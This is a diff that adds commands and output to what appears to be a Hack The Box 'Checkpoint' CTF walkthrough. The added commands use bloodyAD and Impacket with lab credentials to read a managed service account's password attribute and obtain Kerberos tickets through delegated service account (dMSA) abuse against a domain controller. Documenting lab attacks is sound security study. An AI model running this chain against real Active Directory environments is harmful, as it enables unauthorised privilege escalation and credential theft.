@@ -1216,3 +1216,25 @@ Impacket v0.14.0.dev0+20260828.120813.032dfb1b - Copyright Fortra, LLC and its a
 
 
 ```
+
+``` bash
+
+❯ bloodyAD --host dc01.checkpoint.htb --dc-ip 10.129.113.22 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object 'svc_pwn$' --attr msDS-ManagedPassword
+
+distinguishedName: CN=svc_pwn,OU=Employees,DC=checkpoint,DC=htb
+❯ impacket-getTGT checkpoint.htb/alex.turner:'Checkpoint2024!' -dc-ip 10.129.113.22
+
+Impacket v0.14.0.dev0+20260828.120813.032dfb1b - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in alex.turner.ccache
+❯ export KRB5CCNAME=alex.turner.ccache
+
+❯ impacket-getST -dc-ip 10.129.113.22 -spn 'http/dc01.checkpoint.htb' 'checkpoint.htb/svc_pwn$' -k -no-pass -dmsa
+Impacket v0.14.0.dev0+20260828.120813.032dfb1b - Copyright Fortra, LLC and its affiliated companies
+
+[*] Getting ST for user
+[*] Saving ticket in svc_pwn$@http_dc01.checkpoint.htb@CHECKPOINT.HTB.ccache
+╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                                 ✔ ─╮
+╰─                                                                                                               ─╯
+
+```
